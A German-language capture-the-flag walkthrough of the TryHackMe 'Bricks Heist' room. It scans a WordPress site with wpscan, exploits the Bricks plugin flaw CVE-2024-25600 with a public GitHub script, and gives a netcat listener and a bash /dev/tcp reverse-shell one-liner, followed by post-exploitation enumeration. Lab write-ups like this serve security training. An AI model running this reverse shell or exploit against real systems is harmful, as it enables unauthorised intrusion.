
# TryHackMe: Bricks Heist

## 1. Vorbereitung
```bash
gem install wpscan
```
- Installiert **wpscan** auf der AttackBox.

```bash
wpscan --url https://bricks.thm/ --disable-tls-checks
```
- Scannt die Zielseite nach Sicherheitslücken.
  - Erkennt: **Bricks 1.9 CVE-2024-25600** (WordPress Bricks Plugin)

---

## 2. Reverse Shell vorbereiten
```bash
nc -lvnp 4444
```
- Startet einen Netcat Listener auf Port 4444.

```bash
bash -c 'exec bash -i &>/dev/tcp/IP/4444 <&1'
```
- Reverse Shell vom Server (Nutzer: **apache**) zur eigenen Box.

---

## 3. Exploit ausführen

**Exploit-Script herunterladen:**
- GitHub-Link:  
  [https://github.com/nak000/CVE-2024-25600-WordPress-Bricks](https://github.com/nak000/CVE-2024-25600-WordPress-Bricks)

**Abhängigkeiten installieren:**
```bash
pip install requests beautifulsoup4 prompt_toolkit
```

**Exploit ausführen:**
```bash
python3 exploit.py -u https://bricks.thm/
```

---

## 4. Post-Exploitation

```bash
cat 650c844110baced87e1606453b93f22a.txt
```
- Anzeige des Flags oder einer versteckten Datei im Webverzeichnis.

```bash
systemctl | grep running
```
- Auflistung aller aktuell **laufenden Systemdienste**.

```bash
systemctl cat ubuntu.service
```
- Zeigt die Konfiguration des Dienstes `ubuntu.service`.

```bash
cd /lib/NetworkManager/
```
- Wechsel in das Verzeichnis eines verdächtigen Dienstes.
